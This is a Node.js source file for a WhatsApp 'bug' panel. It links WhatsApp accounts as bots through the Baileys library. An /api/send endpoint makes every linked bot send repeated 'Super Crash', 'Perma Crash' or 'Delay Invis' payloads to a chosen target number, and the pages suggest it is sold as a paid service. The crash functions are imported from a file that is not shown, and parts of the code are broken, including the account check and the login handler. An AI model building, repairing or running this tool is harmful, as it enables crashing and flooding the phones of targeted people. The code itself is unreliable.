import { makeWASocket, useMultiFileAuthState, generateWAMessageFromContent, jidDecode, proto, getContentType, downloadContentFromMessage, DisconnectReason, fetchLatestBaileysVersion } from "@whiskeysockets/baileys";
import express from "express";
import pino from "pino";
import { Boom } from "@hapi/boom";
import { exec, execSync, spawn } from "child_process";
import fs from "fs"
import util from "util";
import path from "path";
import crypto from "crypto";
import chalk from "chalk";
const app = express();
import { Bangsat, gacor, crashnoclick, Congdelay, vfz } from "./function.js";
var svrapi = "WyAqIF0gV0VMQ09NRSBUTyBYVkxJUyBBUEkK4oCTIENyZWF0ZSBCeTogQHh2bGlzcmluemUK4oCTIE1ha2UgV2l0aCBMb3ZlIOKZpQ==", port = process.env.PORT || process.env.SERVER_PORT || 3000;
var sleep = ms => new Promise(x => setTimeout(x, Number(ms) || 0));
var ipres, ip;
global.clients = global.clients || {};
var loadDB = (thisfile) => {
	var dir = path.dirname(thisfile);
	if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
	try {
		return JSON.parse(fs.readFileSync(thisfile, "utf8"));
	} catch {
		return {};
	}
}
var saveDB = (thisfile, data) => {
	fs.writeFileSync(thisfile, JSON.stringify(data));
}
async function isAccount({ id, token }) {
	let account = loadDB("./account.json");
	let userdata = Object.values(account).map((x, i) => ({ id: account(Object.keys(account)[i]), token: x.token, username: x.username, password: x.password, admin: x.admin, expired: x.expired }));
	if (userdata.id === "ABC") return false;
	if (userdata.token === "ABC") return false;
	return true;
}
app.use(express.json());
app.get('/', async (req, res) => {
	let data = req.query;
	let headerdata = req.headers;
	//if (!headerdata["user-agent"] && !headerdata["X-auth"]) return;
	//let account = isAccount({})
});
app.get('/login', (req, res) => {
	res.send(`
	<!DOCTYPE html>
	<html lang="en">
		<head>
			<meta charset="UTF-8">
			<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
			<title>LOGIN</title>
			<meta property="og:title" content="XVLIS PANEL" />
			<meta property="og:image" content="thumbnail.png" />
			<meta property="og:description" content="powered by binarycrafter.my.id" />
			<meta property="og:type" content="website" />
			<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
			<style>
				body {
					background: linear-gradient(to bottom, transparent, rgb(var(--background-end-rgb)))
					rgb(var(--background-start-rgb));
				}
				* {
					margin: 0;
					padding: 0;
					box-sizing: border-box;
					font-family:"Poppins", sans-serif;
				}
				html, body {
					height: 100%;
					overflow: hidden;
				}
				body {
					display: flex;
					justify-content: center;
					align-items: center;
					position: relative;
					background-color: #000;
				}
				.stylebackground {
					position: absolute;
					top: -50%;
					left: -50%;
					width: 200%;
					height: 200%;
					background-image: linear-gradient(to bottom, rgba(255, 255, 255, 0) 1px, rgba(100, 100, 100, 0.08) 4px);
					background-size: 100% 10px;
					z-index: -1;
				}
				.form-container {
					top: 50%;
					left: 50%;
					width:90%;
					max-width: 300px;
					padding: 10px;
					border:2px solid rgba(255,255,255,0.3);
					background:rgba(255,255,255,0.05);
					transform: translate(-50%,-50%);
					z-index: 2;
				}
				.form-container h2 {
					margin-bottom: 10px;
					font-size: 25px;
					color: #fff;
					font-weight: 600;
					text-shadow: 0 0 10px rgba(255,255,255,0.3);
					letter-spacing: 1px;
					text-align: center;
					white-space: nowrap;
				}
				.textinput {
					position: relative;
					margin-bottom: 5px;
				}
				.textinput i {
					position: absolute;
					top: 50%;
					transform: translateY(-50%);
					color: #aaa;
					font-size: 16px;
				}
				.textinput input {
					width:100%;
					padding:12px 15px 12px;
					border:2px solid rgba(255,255,255,0.3);
					background:rgba(255,255,255,0.05);
					color:#fff;
					font-size:15px;
					outline:none;
					transition:0.3s;
				}
				.textinput input:focus {
					border-color:#fff;
					box-shadow:0 0 10px rgba(255,255,255,0.4);
				}
				.textinput select{
					width:100%;
					padding:12px 15px 12px 42px;
					border:2px solid rgba(255,255,255,0.3);
					background:rgba(255,255,255,0.05);
					color: #aaa;
					font-size:15px;
					outline:none;
					transition:0.3s;
				}
				.textinput select:focus{
					border-color:#fff;
					box-shadow:0 0 10px rgba(255,255,255,0.4);
				}
				.textinput option{
					background:#111;
					color:#fff;
				}
				button {
					border:2px solid rgba(255,255,255,0.3);
					background:rgba(255,255,255,0.05);
					color:#fff;
					font-size:15px;
					transition:0.3s;
				}
				button:hover {
					border-color:#fff;
					box-shadow:0 0 10px rgba(255,255,255,0.4);
				}
				footer { position:absolute;bottom:10px;width:100%;text-align:center;font-size:12px;color:#888; }
			</style>
		</head>
		<body>
			<div class="stylebackground"></div>
			<form class="form-container" style="position: absolute;">
				<h2>LOGIN</h2>
				<center><a style="color:#aaa;text-align: center;font-size: 15px;">Lakukan Pembayaran Terlebih Dahulu Untuk Membuat Akun</a></center>
				<div class="textinput">
					<i class="fas fa-user" style="left: 15px"></i>
					<input style="padding-left: 42px;" type="text" id="luser" placeholder="username"/>
				</div>
				<div class="textinput">
					<i class="fas fa-key" style="left: 15px"></i>
					<input style="padding-left: 42px;" type="text" id="lpass" placeholder="password"/>
				</div>
				<button style="width:100%;padding:12px;">SUBMIT</button>
			</form>
			<footer>Powered By <a href="https://binarycrafter.my.id" style="color:#A7B">BinaryCrafter</a></footer>
		</body>
		<script>
			async function _request(url, param) {
				let res = await fetch(url + param, {
					method: "GET",
					headers: {
						"User-Agent": navigator.userAgent,
						"X-auth": localStorage.getItem("key"),
					}
				});
				return res;
			}
			async function login() {
				let data = await _request("http://${ip}:${port}/")
			}
			window.onload = () => {
				showUI(shownow, false);
			};
		</script>
	</html>
	`)
});
app.get('/admin', (req, res) => {
	res.send(`
	<!DOCTYPE html>
	<html lang="en">
		<head>
			<meta charset="UTF-8">
			<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
			<title>ADMIN PANEL</title>
			<meta property="og:title" content="XVLIS PANEL" />
			<meta property="og:image" content="thumbnail.png" />
			<meta property="og:description" content="powered by binarycrafter.my.id" />
			<meta property="og:type" content="website" />
			<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
			<style>
				body {
					background: linear-gradient(to bottom, transparent, rgb(var(--background-end-rgb)))
					rgb(var(--background-start-rgb));
				}
				* {
					margin: 0;
					padding: 0;
					box-sizing: border-box;
					font-family:"Poppins", sans-serif;
				}
				html, body {
					height: 100%;
					overflow: hidden;
				}
				body {
					display: flex;
					justify-content: center;
					align-items: center;
					position: relative;
					background-color: #000;
				}
				.stylebackground {
					position: absolute;
					top: -50%;
					left: -50%;
					width: 200%;
					height: 200%;
					background-image: linear-gradient(to bottom, rgba(255, 255, 255, 0) 1px, rgba(100, 100, 100, 0.08) 4px);
					background-size: 100% 10px;
					z-index: -1;
				}
				.form-container {
					top: 50%;
					left: 50%;
					width:90%;
					max-width: 300px;
					padding: 10px;
					border:2px solid rgba(255,255,255,0.3);
					background:rgba(255,255,255,0.05);
					transform: translate(-50%,-50%);
					z-index: 2;
				}
				.form-container h2 {
					margin-bottom: 10px;
					font-size: 25px;
					color: #fff;
					font-weight: 600;
					text-shadow: 0 0 10px rgba(255,255,255,0.3);
					letter-spacing: 1px;
					text-align: center;
					white-space: nowrap;
				}
				.textinput {
					position: relative;
					margin-bottom: 5px;
				}
				.textinput i {
					position: absolute;
					top: 50%;
					transform: translateY(-50%);
					color: #aaa;
					font-size: 16px;
				}
				.textinput input {
					width:100%;
					padding:12px 15px 12px;
					border:2px solid rgba(255,255,255,0.3);
					background:rgba(255,255,255,0.05);
					color:#fff;
					font-size:15px;
					outline:none;
					transition:0.3s;
				}
				.textinput input:focus {
					border-color:#fff;
					box-shadow:0 0 10px rgba(255,255,255,0.4);
				}
				.textinput select{
					width:100%;
					padding:12px 15px 12px 42px;
					border:2px solid rgba(255,255,255,0.3);
					background:rgba(255,255,255,0.05);
					color: #aaa;
					font-size:15px;
					outline:none;
					transition:0.3s;
				}
				.textinput select:focus{
					border-color:#fff;
					box-shadow:0 0 10px rgba(255,255,255,0.4);
				}
				.textinput option{
					background:#111;
					color:#fff;
				}
				button {
					border:2px solid rgba(255,255,255,0.3);
					background:rgba(255,255,255,0.05);
					color:#fff;
					font-size:15px;
					transition:0.3s;
				}
				button:hover {
					border-color:#fff;
					box-shadow:0 0 10px rgba(255,255,255,0.4);
				}
				footer { position:absolute;bottom:10px;width:100%;text-align:center;font-size:12px;color:#888; }
			</style>
		</head>
		<body>
			<div class="stylebackground"></div>
			<div style="display: flex;position: absolute;justify-content:space-between;align-items:center;top:0px;width:100%;max-width: 1000px;padding: 15px;border:2px solid rgba(255,255,255,0.3);background:rgba(000,000,000,0.1);">
				<button style="position: relative;left: 88px;width:30%;padding:12px;" onclick="showUI('page1')" >ADD</button>
				<button style="position: relative;right: 88px;width:30%;padding:12px;" onclick="showUI('page2')">DELETE</button>
			</div>
			<form id="page1" class="form-container" style="position: absolute;display: none;">
				<h2>ADD USER</h2>
				<div class="textinput">
					<i class="fas fa-user" style="left: 15px"></i>
					<input style="padding-left: 42px;" type="text" id="luser" placeholder="username"/>
				</div>
				<div class="textinput">
					<i class="fas fa-key" style="left: 15px"></i>
					<input style="padding-left: 42px;" type="text" id="lpass" placeholder="password"/>
				</div>
				<button style="width:100%;padding:12px;">SUBMIT</button>
			</form>
			<footer>Powered By <a href="https://binarycrafter.my.id" style="color:#A7B">BinaryCrafter</a></footer>
		</body>
		<script>
			let shownow = "page1";
			function showUI(n, sn = shownow) {
				if (sn) {
					if (n === sn && document.getElementById(sn).style.display === "none") return;
					document.getElementById(sn).style.display = "none";
				}
				document.getElementById(n).style.display = "block";
				shownow = n;
			}
			window.onload = () => {
				showUI(shownow, false);
			};
		</script>
	</html>
	`)
});
app.get('/dashboard', (req, res) => {
	let data = req.query;
	let headerdata = req.headers;
	if (!headerdata["user-agent"]) return;
	res.send(`
	<!DOCTYPE html>
	<html lang="en">
		<head>
			<meta charset="UTF-8">
			<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
			<title>DASHBOARD</title>
			<meta property="og:title" content="XVLIS PANEL" />
			<meta property="og:image" content="thumbnail.png" />
			<meta property="og:description" content="powered by binarycrafter.my.id" />
			<meta property="og:type" content="website" />
			<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
			<style>
				body {
					background: linear-gradient(to bottom, transparent, rgb(var(--background-end-rgb)))
					rgb(var(--background-start-rgb));
				}
				* {
					margin: 0;
					padding: 0;
					box-sizing: border-box;
					font-family:"Poppins", sans-serif;
				}
				html, body {
					height: 100%;
					overflow: hidden;
				}
				body {
					display: flex;
					justify-content: center;
					align-items: center;
					position: relative;
					background-color: #000;
				}
				.stylebackground {
					position: absolute;
					top: -50%;
					left: -50%;
					width: 200%;
					height: 200%;
					background-image: linear-gradient(to bottom, rgba(255, 255, 255, 0) 1px, rgba(100, 100, 100, 0.08) 4px);
					background-size: 100% 10px;
					z-index: -1;
				}
				.form-container {
					top: 50%;
					left: 50%;
					width:90%;
					max-width: 300px;
					padding: 10px;
					border:2px solid rgba(255,255,255,0.3);
					background:rgba(255,255,255,0.05);
					transform: translate(-50%,-50%);
					z-index: 2;
				}
				.form-container h2 {
					margin-bottom: 15px;
					font-size: 25px;
					color: #fff;
					font-weight: 600;
					text-shadow: 0 0 10px rgba(255,255,255,0.3);
					letter-spacing: 1px;
					text-align: center;
					white-space: nowrap;
				}
				.textinput {
					position: relative;
					margin-bottom: 5px;
				}
				.textinput i {
					position: absolute;
					top: 50%;
					transform: translateY(-50%);
					color: #aaa;
					font-size: 16px;
				}
				.textinput input {
					width:100%;
					padding:12px 15px 12px;
					border:2px solid rgba(255,255,255,0.3);
					background:rgba(255,255,255,0.05);
					color:#fff;
					font-size:15px;
					outline:none;
					transition:0.3s;
				}
				.textinput input:focus {
					border-color:#fff;
					box-shadow:0 0 10px rgba(255,255,255,0.4);
				}
				.textinput select{
					width:100%;
					padding:12px 15px 12px 42px;
					border:2px solid rgba(255,255,255,0.3);
					background:rgba(255,255,255,0.05);
					color: #aaa;
					font-size:15px;
					outline:none;
					transition:0.3s;
				}
				.textinput select:focus{
					border-color:#fff;
					box-shadow:0 0 10px rgba(255,255,255,0.4);
				}
				.textinput option{
					background:#111;
					color:#fff;
				}
				button {
					border:2px solid rgba(255,255,255,0.3);
					background:rgba(255,255,255,0.05);
					color:#fff;
					font-size:15px;
					transition:0.3s;
				}
				button:hover {
					border-color:#fff;
					box-shadow:0 0 10px rgba(255,255,255,0.4);
				}
				footer { position:absolute;bottom:10px;width:100%;text-align:center;font-size:12px;color:#888; }
			</style>
		</head>
		<body>
			<div class="stylebackground"></div>
			<div style="display: flex;position: absolute;justify-content:space-between;align-items:center;top:0px;width:100%;max-width: 1000px;padding: 15px;border:2px solid rgba(255,255,255,0.3);background:rgba(000,000,000,0.1);">
				<button style="position: relative;left: 88px;width:30%;padding:12px;" onclick="showUI('page1')" >SENDER SEND</button>
				<button style="position: relative;left: 88px;transform: translateX(-50%);width:30%;padding:12px;" onclick="showUI('page2')">SENDER USER</button>
				<button style="position: relative;right: 0px;width:8%;padding:5px;" onclick="showUI('page3')">☰</button>
			</div>
			<form id="page1" class="form-container" style="position: absolute;display: none;">
				<h2>SENDER SEND</h2>
				<div class="textinput">
					<i class="fas fa-phone" style="left: 15px"></i>
					<input style="padding-left: 42px;" type="text" id="starget" placeholder="target"/>
				</div>
				<div class="textinput">
					<i class="fas fa-clone" style="left: 15px"></i>
					<input style="padding-left: 42px;" type="text" id="samount" placeholder="jumlah"/>
				</div>
				<div class="textinput">
					<i class="fas fa-window-restore" style="left: 15px"></i>
					<select>
						<optgroup label="JENIS BUG">
							<option id="stype" value="">Delay Invis</option>
							<option value="stype">Super Crash</option>
							<option value="stype" selected>Perma Crash</option>
						</optgroup>
					</select>
				</div>
				<button style="width:100%;padding:12px;">SEND</button>
			</form>
			<form id="page2" class="form-container" style="position: absolute;display: none;">
				<h2>SENDER USER</h2>
				<div class="textinput">
					<i style="left: 10px" id="sustatus">TOTAL BOT: ${Object.keys(global.clients).length}</i>
					<input style="padding-left: 110px;" disabled>
				</div>
				<div class="textinput">
					<i class="fas fa-phone" style="left: 15px"></i>
					<input style="padding-left: 42px;" type="text" id="sunumber" placeholder="number"/>
				</div>
				<button style="width:100%;padding:12px;" onclick="_connect()">SEND</button>
			</form>
			<form id="page3" class="form-container" style="position: absolute;display: none;">
				<h2>ACCOUNT</h2>
			</form>
			<footer>Powered By <a href="https://binarycrafter.my.id" style="color:#A7B">BinaryCrafter</a></footer>
		</body>
		<script>
			let shownow = "page1";
			function showUI(n, sn = shownow) {
				if (sn) {
					if (n === sn && document.getElementById(sn).style.display === "none") return;
					document.getElementById(sn).style.display = "none";
				}
				document.getElementById(n).style.display = "block";
				shownow = n;
			}
			async function _request(url, param) {
				let res = await fetch(url + param, {
					method: "GET",
					headers: {
						"User-Agent": navigator.userAgent,
						"X-auth": localStorage.getItem("key"),
					}
				});
				return res;
			}
			function _connect() {
				let number = document.getElementById("sunumber");
				if (number) return alert(" MASUKAN NOMOR\\n CONTOH: 62xxxxx");
				let res = _request("http://${ip}:${port}/", \`api/send?number=\${number}&id=\`);
				let data = res.json();
				if (data.success) return alert(data.message || "request error");
			}
			window.onload = () => {
				showUI(shownow, false);
			};
		</script>
	</html>
	`)
});
app.get('/api/v', (req, res) => {
});
app.get('/api/connect', async (req, res) => {
	let data = req.query;
	if (!data.number) {
		res.json({
			success: false,
			code: "",
			message: "failed enter the number 62xxx",
		});
	} else {
		if (isNaN(data.number) || data.number.length < 10) {
			return res.json({
				success: false,
				code: "",
				message: "enter a valid number",
			});
		}
		await StartBotz(data.number);
		let dataclient = global.clients[data.number];
		res.json({
			success: dataclient.pairingcode ? true : false,
			code: dataclient.pairingcode || "",
			message: dataclient.status === "starting" ? "code only invalid for 5 minutes" : dataclient.status === "connected" ? "already connected" : "error",
		});
	}
});
app.get('/api/send', async (req, res) => {
	let data = req.query;
	let amount = data.amount || 3;
	if (!global.clients || Object.keys(global.clients).length === 0) {
		return res.json({
			success: false,
			message: "tidak ada bot aktif"
		});
	}
	if (!data.target) {
		return res.json({
			success: false,
			target: "",
			amount: amount,
			message: "failed to send, please enter the target correctly example: 62xxxx@s.whatsapp.net"
		});
	}
	for (let number in global.clients) {
		let conn = global.clients[number].conn;
		for (let i = 0; i < amount; i++) {
			switch (data.type) {
				case "delayinvis":
					await Congdelay(conn, data.target);
				break;
				case "supercrash":
					await crashnoclick(conn, data.target);
					await sleep(5000);
					await vfz(conn, data.target);
					await sleep(5000);
					await Bangsat(conn, data.target);
					await sleep(5000);
					await gacor(conn, data.target);
				break;
				default:
					await crashnoclick(conn, data.target);
					await sleep(5000);
					await Congdelay(conn, data.target);
					await sleep(5000);
					await vfz(conn, data.target);
					await sleep(5000);
					await Bangsat(conn, data.target);
					await sleep(5000);
					await gacor(conn, data.target);
				break;
			}
		}
	}
	res.json({
		success: true,
		target: data.target,
		amount: amount,
		message: "success"
	});
});
app.get('/api/status', async (req, res) => {
	if (global.clients && Object.keys(global.clients).length !== 0) {
		return res.json({
			totalbot: Object.keys(global.clients).length,
			message: "active"
		});
	} else {
		return res.json({
			totalbot: 0,
			message: "none"
		});
	}
});
app.listen(port, async () => {
	try {
		ipres = await fetch("https://icanhazip.com");
		ip = (await ipres.text()).trim();
	} catch {
		ipres = "";
		ip = "127.0.0.1";
	}
	console.clear();
	console.log(chalk.green(Buffer.from(svrapi, "base64").toString()));
	console.log(chalk.black.bgBlue(` [ * ] server running on ${ip}:${port} `))
});
if (fs.existsSync("./session")) {
	const sessions = fs.readdirSync("./session")
	for (let number of sessions) {
		StartBotz(number)
	}
}
async function StartBotz(number) {
	if (fs.existsSync(`./session/${number}`) && (!fs.existsSync(`./session/${number}/creds.json`) || fs.statSync(`./session/${number}/creds.json`).size < 10)) {
		fs.rmSync(`./session/${number}`, { recursive: true, force: true });
	}
	if (global.clients[number]?.status === "starting" || global.clients[number]?.status === "connected") return { code: null };
	global.clients[number] = { status: "starting" };
	var { state, saveCreds } = await useMultiFileAuthState(`./session/${number}`)
	var { version } = await fetchLatestBaileysVersion()
	var conn = makeWASocket({
		version,
		logger: pino({ level: "silent" }),
		printQRInTerminal: false,
		auth: state,
		browser: ["Ubuntu", "Chrome", "22.04.4"],
		syncFullHistory: false,
		shouldSyncHistoryMessage: () => false,
		defaultQueryTimeoutMs: 30000,
		keepAliveIntervalMs: 30000,
		getMessage: async () => {
			return {};
		}
	});
	var code;
	if (!conn.authState.creds.registered) {
		if (!number || number.length < 8) {
			return console.log(chalk.black.bgYellow(" INVALID "), ("EX: 123xxxx "));
		}
		await sleep(2000);
		code = await conn.requestPairingCode(number.trim());
		code = code?.match(/.{1,4}/g)?.join("-") || code;
		global.clients[number] = { status: global.clients[number].status, pairingcode: code };
	}
	conn.ev.on("creds.update", saveCreds);
	conn.ev.on("connection.update", async (update) => {
		const { connection, lastDisconnect } = update;
		if (connection === "open") {
			global.clients[number] = { status: "connected", conn };
			console.log(chalk.black.bgYellow(` [ X V ] Connection – Number: ${conn.user.id} `));
		} else if (connection === "close") {
			const shouldReconnect = lastDisconnect?.error?.output?.statusCode;
			if (shouldReconnect === DisconnectReason.loggedOut) {
				delete global.clients[number];
				fs.rmSync(`./session/${number}`, { recursive: true, force: true });
			} else if (shouldReconnect !== DisconnectReason.loggedOut) {
				console.log(chalk.black.bgGreen(" WhatsApp "), chalk.yellow(shouldReconnect ? "Reconnecting..." : "Re-Login"));
				setTimeout(() => {
					conn.ev.removeAllListeners();
					delete global.clients[number];
					console.log(chalk.black.bgBlue(` [ * ] server running on ${ip}:${port} `))
					StartBotz(number)
				}, 800);
			}
		}
	});
}